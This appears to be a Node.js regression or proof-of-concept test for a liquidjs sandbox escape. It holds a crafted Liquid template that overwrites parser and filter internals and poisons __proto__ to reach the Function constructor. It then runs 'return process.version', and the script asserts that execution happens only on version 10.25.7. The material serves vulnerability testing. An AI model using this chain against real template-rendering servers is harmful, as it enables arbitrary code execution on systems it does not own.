import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { Liquid } from "liquidjs";

const manifest = JSON.parse(
  await readFile(new URL("./package.json", import.meta.url), "utf8"),
);
const version = manifest.dependencies.liquidjs;
const shouldExecute = version === "10.25.7";
const engine = new Liquid();

const storeFunction = (destination, source) => {
  const parts = source.split(".");
  const objectPath = parts.slice(0, -1).join(".");
  const property = parts.at(-1);
  return `
{% assign _group = ${objectPath} | group_by: "0" %}
{% assign _selected = _group | where: name, "${property}" | first %}
{% assign ${destination} = _selected.items | first | last %}`;
};

const template = `
{% liquid
assign receiver = 1 | valueOf
assign scope = receiver.context.scopes | first
assign liquid = receiver.liquid
assign parser = liquid.parser
assign filters = liquid.filters
assign name = "name" %}
${storeFunction("equals", "parser.parseFile")}
${storeFunction("gt", "parser.parseFile")}
${storeFunction("geq", "parser.parseFile")}
${storeFunction("lt", "parser.parseFile")}
${storeFunction("leq", "parser.parseFile")}
${storeFunction("readFile", "filters.default")}
${storeFunction("lookup", "filters.raw.handler")}
{% assign loader = scope %}
{% assign context = scope %}
{% assign opts = scope %}
{% assign liquid = scope %}
{% assign options = scope %}
{% assign __proto__ = parser %}
{% assign tagDelimiterLeft = name %}
{% assign tagDelimiterRight = name %}
{% assign outputDelimiterLeft = '[' %}
{% assign outputDelimiterRight = ']' %}
${storeFunction("filters", "filters.raw.handler")}
{% assign output = scope == "[0|constructor]" | first %}
{% assign constructor = output.value.filters | first %}
${storeFunction("equals", "constructor.handler")}
{% assign sentinel = scope == "return process.version" %}
{{ sentinel }}`;

const value = (await engine.parseAndRender(template, {})).trim();
const executed = value === process.version;
assert.equal(executed, shouldExecute);
if (!shouldExecute) assert.equal(value, "false");
process.stdout.write(`${JSON.stringify({ version, executed, value })}\n`);
